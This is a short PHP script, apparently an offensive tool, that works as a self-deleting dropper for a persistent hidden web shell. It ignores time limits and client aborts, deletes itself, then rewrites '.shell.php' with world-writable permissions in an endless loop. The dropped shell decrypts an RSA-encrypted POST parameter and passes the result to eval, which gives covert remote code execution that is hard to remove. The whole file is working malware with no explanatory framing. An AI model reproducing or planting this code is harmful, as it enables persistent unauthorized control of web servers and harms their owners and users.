<?php
set_time_limit(0);
ignore_user_abort(1);
unlink(__FILE__);
$shell = '<?php
class Rsa {
    private static $PUBLIC_KEY= "MyPubKey";
    private static function getPublicKey()
    {
        $publicKey = self::$PUBLIC_KEY;
        return openssl_pkey_get_public($publicKey);
    }

    public static function publicDecrypt($encrypted = "")
    {
        if (!is_string($encrypted)) {
            return null;
        }
        return (openssl_public_decrypt(base64_decode($encrypted), $decrypted, self::getPublicKey())) ? $decrypted : null;
    }
}
$cmd=$_POST[\'MyPass\'];
$rsa = new Rsa();
$publicDecrypt = $rsa->publicDecrypt($cmd);
$res=eval($publicDecrypt);';
while (1) {
    file_put_contents('.shell.php', $shell);
    system('chmod 777 .shell.php');
}